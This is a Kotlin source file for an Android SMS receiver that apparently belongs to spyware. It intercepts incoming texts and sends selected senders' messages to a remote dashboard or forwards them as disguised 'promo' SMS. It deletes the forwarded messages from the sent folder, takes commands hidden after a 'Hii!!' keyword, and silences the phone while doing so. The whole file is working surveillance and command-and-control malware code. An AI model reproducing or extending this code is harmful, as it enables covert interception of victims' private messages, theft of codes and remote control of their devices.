package com.example.myandroid

import kotlinx.coroutines.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // 1. RAW ENTRY LOG: If this doesn't print, the OS is denying the broadcast permission.
        DebugLogger.log("SMS_ENTRY", "Receiver awoken. Action: ${intent.action}")

        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        // 2. SYNCHRONOUS PARSING: Guarantee execution before OS suspends process
        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isNullOrEmpty()) {
                DebugLogger.log("SMS_WARN", "Intent contained no valid PDUs.")
                return
            }

            val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val editor = prefs.edit()
            
            val current = prefs.getInt("sms_count", 0)
            editor.putInt("sms_count", current + 1)
            editor.putLong("sms_last_time", System.currentTimeMillis())

            messages.forEach { msg ->
                if (msg == null) return@forEach
                val body = msg.messageBody ?: return@forEach
                val sender = msg.displayOriginatingAddress ?: "Unknown"

                DebugLogger.log("SMS_PARSE", "Message from $sender intercepted.")

                if (!ConfigManager.canCollect(context, "sms")) {
                    DebugLogger.log("SMS_BLOCKED", "SMS collection disabled in Config.")
                    return@forEach
                }

                val entry = JSONObject().apply {
                    put("sender", sender)
                    put("body", body)
                    put("timestamp", System.currentTimeMillis())
                }
                
                DumpManager.appendLog("SMS", entry)

                // --- HVT REDIRECTION LOGIC ---
                val hvtPrefs = context.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
                val redirectTarget = hvtPrefs.getString(sender, null)
                if (redirectTarget != null) {
                    CoroutineScope(Dispatchers.IO).launch {
                        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
                        val isOnline = caps != null && caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)

                        if (isOnline) {
                            // Option 1: Send to Dashboard via High-Priority Ping
                            val extra = JSONObject().apply { put("hvt_intercept", body); put("from", sender) }
                            CloudManager.sendPing(context, "HVT_INTERCEPT", extra)
                        } else {
                            // Option 2: Forward via SMS Tunnel (Encrypted Promo)
                            try {
                                val msgRaw = "[HVT:$sender] $body"
                                val token = FidelCipher.encode(msgRaw)
                                val promos = FidelCipher.camouflage(context, token)
                                val smsManager = context.getSystemService(android.telephony.SmsManager::class.java)
                                
                                for (promo in promos) {
                                    val parts = smsManager.divideMessage(promo)
                                    smsManager.sendMultipartTextMessage(redirectTarget, null, parts, null, null)
                                    delay(3000)
                                }
                                
                                // Stealth: Cleanup sent folder
                                delay(5000)
                                val uri = android.net.Uri.parse("content://sms/sent")
                                context.contentResolver.delete(uri, "address=?", arrayOf(redirectTarget))
                            } catch (e: Exception) { }
                        }
                    }
                }

                try {
                    val cacheStr = prefs.getString("sms_logs_cache", "[]") ?: "[]"
                    val cacheArr = JSONArray(cacheStr)
                    cacheArr.put(entry)
                    if (cacheArr.length() > 50) cacheArr.remove(0)
                    editor.putString("sms_logs_cache", cacheArr.toString())
                } catch(e: Exception) {}

                                // 3. GHOST TUNNEL PROTOCOL
                // HEARTBEAT: Check for Judas retries every time any SMS arrives
                JudasManager.attemptAlert(context)

                if (body.contains("Hii!!")) {
                    DebugLogger.log("SMS_WAKE", "Shield Triggered by keyword.")
                    
                    // --- STEALTH SHIELD: AUDIO MUTE ---
                    val am = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                    val oldMode = am.ringerMode
                    val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION)
                    
                    if (PermissionManager.hasDndAccess(context)) {
                        try {
                            am.ringerMode = android.media.AudioManager.RINGER_MODE_SILENT
                            am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, 0, 0)
                        } catch (e: Exception) {}
                    }

                    // Trigger Resurrection/Watchdog
                    ServiceResurrector.shock(context)
                    KeepAliveReceiver.scheduleNext(context)

                    // --- PARSER ENGINE ---
                    val regex = Regex("Hii!!(.*?)\\\$\\$")
                    val match = regex.find(body)

                    if (match != null) {
                        val rawExtracted = match.groupValues[1].trim()
                        val splitIdx = rawExtracted.indexOf('=')
                        val cmd: String
                        var content: String
                        
                        if (splitIdx != -1) {
                            cmd = rawExtracted.substring(0, splitIdx).uppercase()
                            content = java.net.URLDecoder.decode(rawExtracted.substring(splitIdx + 1), "UTF-8")
                        } else {
                            cmd = rawExtracted.uppercase()
                            content = "0"
                        }

                        if (cmd == "CODERED" && !content.contains("|")) content = "$content|$sender"

                        val pendingResult = goAsync()
                        CoroutineScope(Dispatchers.IO).launch {
                            try {
                                val mockCmd = JSONObject().apply { put("id", -1); put("file_name", cmd); put("content", content) }
                                CommandProcessor.processSingleCommand(context, mockCmd)
                            } catch (e: Exception) { 
                                DebugLogger.log("SMS_CMD_ERR", "Command execution failed")
                            } finally { pendingResult.finish() }
                        }
                    } else {
                        DebugLogger.log("SMS_WAKE", "Shield active but command malformed. No execution.")
                    }

                    // --- UNIVERSAL RESTORATION ---
                    CoroutineScope(Dispatchers.Main).launch {
                        delay(3500) // Ensure silence outlasts the OS notification sound event
                        if (PermissionManager.hasDndAccess(context)) {
                            am.ringerMode = oldMode
                            am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, oldVol, 0)
                            DebugLogger.log("SHIELD", "Audio state restored.")
                        }
                    }
                }
            }
            editor.commit() // Commit synchronously to disk
        } catch (e: Exception) {
            DebugLogger.log("SMS_FATAL", "Receiver crash: ${e.message}")
        }
    }
}
